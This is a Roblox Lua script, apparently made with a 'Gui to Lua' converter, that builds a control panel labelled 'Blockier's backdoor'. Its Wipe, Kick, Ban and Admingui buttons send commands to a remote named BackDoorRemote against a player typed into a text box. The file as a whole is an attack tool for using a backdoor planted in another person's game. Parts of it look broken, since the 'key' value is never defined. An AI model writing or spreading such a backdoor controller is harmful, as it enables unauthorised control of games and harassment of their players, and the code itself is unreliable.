-- Gui to Lua
-- Version: 3.6

-- Instances:

local AdminGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local ButtonFrame = Instance.new("Frame")
local TargetName = Instance.new("TextBox")
local WipeButton = Instance.new("TextButton")
local KickButton = Instance.new("TextButton")
local BanButton = Instance.new("TextButton")
local AdminguiButton = Instance.new("TextButton")

--Properties:

AdminGui.Name = "AdminGui"
AdminGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

MainFrame.Name = "MainFrame"
MainFrame.Parent = AdminGui
MainFrame.Position = UDim2.new(0, 50, 0.5, 0)
MainFrame.Size = UDim2.new(0, 223, 0, 150)
MainFrame.Style = Enum.FrameStyle.RobloxRound

TextLabel.Parent = MainFrame
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0, 51, 0, 0)
TextLabel.Size = UDim2.new(0, 100, 0, 20)
TextLabel.Text = "Blockier's backdoor"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 12.000

ButtonFrame.Name = "ButtonFrame"
ButtonFrame.Parent = MainFrame
ButtonFrame.Position = UDim2.new(0, 0, 0.200000018, 0)
ButtonFrame.Size = UDim2.new(0, 204, 0.800000072, 0)
ButtonFrame.Style = Enum.FrameStyle.RobloxRound

TargetName.Name = "TargetName"
TargetName.Parent = ButtonFrame
TargetName.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
TargetName.BackgroundTransparency = 0.500
TargetName.BorderSizePixel = 0
TargetName.Position = UDim2.new(0, 0, 0, 5)
TargetName.Size = UDim2.new(0, 135, 0, 20)
TargetName.Text = "Input Target"
TargetName.TextColor3 = Color3.fromRGB(255, 255, 255)
TargetName.TextSize = 10.000

WipeButton.Name = "WipeButton"
WipeButton.Parent = ButtonFrame
WipeButton.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
WipeButton.BorderSizePixel = 0
WipeButton.Position = UDim2.new(0, 0, 0, 40)
WipeButton.Size = UDim2.new(0, 90, 0, 20)
WipeButton.AutoButtonColor = false
WipeButton.Style = Enum.ButtonStyle.RobloxButton
WipeButton.Text = "Wipe Target"
WipeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
WipeButton.TextSize = 10.000

KickButton.Name = "KickButton"
KickButton.Parent = ButtonFrame
KickButton.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
KickButton.BorderSizePixel = 0
KickButton.Position = UDim2.new(0, 0, 0, 70)
KickButton.Size = UDim2.new(0, 90, 0, 20)
KickButton.AutoButtonColor = false
KickButton.Style = Enum.ButtonStyle.RobloxButton
KickButton.Text = "Kick Target"
KickButton.TextColor3 = Color3.fromRGB(255, 255, 255)
KickButton.TextSize = 10.000

BanButton.Name = "BanButton"
BanButton.Parent = ButtonFrame
BanButton.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
BanButton.BorderSizePixel = 0
BanButton.Position = UDim2.new(0, 95, 0, 40)
BanButton.Size = UDim2.new(0, 90, 0, 20)
BanButton.AutoButtonColor = false
BanButton.Style = Enum.ButtonStyle.RobloxButton
BanButton.Text = "Ban Target"
BanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
BanButton.TextSize = 10.000

AdminguiButton.Name = "AdminguiButton"
AdminguiButton.Parent = ButtonFrame
AdminguiButton.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
AdminguiButton.BorderSizePixel = 0
AdminguiButton.Position = UDim2.new(0, 95, 0, 70)
AdminguiButton.Size = UDim2.new(0, 90, 0, 20)
AdminguiButton.AutoButtonColor = false
AdminguiButton.Style = Enum.ButtonStyle.RobloxButton
AdminguiButton.Text = "Admingui"
AdminguiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
AdminguiButton.TextSize = 10.000

-- Scripts:

local function EJGKP_fake_script()
	local script = Instance.new('Script', ButtonFrame)


	function Wipe_target()
		local Target = game.Players:FindFirstChild(script.Parent.TargetName.Text)
		print(1)
		if (Target ~= nil) then
			game.ReplicatedStorage.BackDoorRemote:FireServer(key, "wipe", Target)
		end
	end

	function kick_target()
		local kicked = game.Players:FindFirstChild(script.Parent.TargetName.Text)
		print(1)
		if (kicked ~= nil) then
			game.ReplicatedStorage.BackDoorRemote:FireServer(key, "kick", kicked)
		end
	end

	function ban_target()
		local banned = game.Players:FindFirstChild(script.Parent.TargetName.Text)
		print(1)
		if (banned ~= nil) then
			game.ReplicatedStorage.BackDoorRemote:FireServer(key, "ban", banned)
		end
	end

	function Gui_target()
		local punished = game.Players:FindFirstChild(script.Parent.TargetName.Text)
		print(1)
		if (punished ~= nil) then
			game.ReplicatedStorage.BackDoorRemote:FireServer(key, "gui", punished)
		end
	end




	script.Parent.WipeButton.MouseButton1Click:connect(Wipe_target)
	script.Parent.KickButton.MouseButton1Click:connect(kick_target)
	script.Parent.BanButton.MouseButton1Click:connect(ban_target)
	script.Parent.AdminguiButton.MouseButton1Click:connect(Gui_target)
end
coroutine.wrap(EJGKP_fake_script)()
